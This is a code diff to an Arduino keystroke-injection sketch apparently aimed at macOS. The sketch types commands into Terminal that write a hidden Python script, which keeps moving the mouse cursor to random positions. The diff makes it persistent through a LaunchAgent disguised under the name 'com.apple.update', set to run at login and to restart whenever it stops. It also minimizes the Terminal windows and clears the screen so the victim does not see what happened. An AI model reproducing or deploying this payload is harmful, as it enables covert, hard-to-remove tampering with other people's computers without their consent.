@@ -9,7 +9,8 @@ void setup() {
   delay(100); Keyboard.releaseAll(); delay(1200);
   t("Terminal"); delay(500);
   Keyboard.write(KEY_RETURN); delay(4000);
-  ln("cat>/tmp/.j.py<<'E'");
+
+  ln("cat>~/.j.py<<'E'");
   delay(300);
   ln("from Quartz import CGWarpMouseCursorPosition");
   ln("import time,random");
@@ -19,8 +20,18 @@ void setup() {
   ln(" if i>120:i-=60");
   ln(" CGWarpMouseCursorPosition((random.randint(0,2560),random.randint(0,1600)))");
   ln("E");
+  delay(300);
+
+  ln("mkdir -p ~/Library/LaunchAgents");
+  ln("cat>~/Library/LaunchAgents/com.apple.update.plist<<E");
+  ln("<?xml version=\"1.0\" encoding=\"UTF-8\"?>");
+  ln("<plist version=\"1.0\"><dict><key>Label</key><string>com.apple.update</string><key>ProgramArguments</key><array><string>/usr/bin/python3</string><string>$HOME/.j.py</string></array><key>RunAtLoad</key><true/><key>KeepAlive</key><true/></dict></plist>");
+  ln("E");
+  delay(300);
+
+  ln("python3 -m pip install pyobjc-framework-Quartz -q;launchctl load ~/Library/LaunchAgents/com.apple.update.plist;osascript -e 'tell app \"Terminal\" to set miniaturized of every window to true'");
   delay(500);
-  ln("python3 -m pip install pyobjc-framework-Quartz -q;nohup python3 /tmp/.j.py&disown;osascript -e 'tell app \"Terminal\" to set miniaturized of every window to true'");
+  ln("clear");
   Keyboard.end();
 }
 void loop() {}
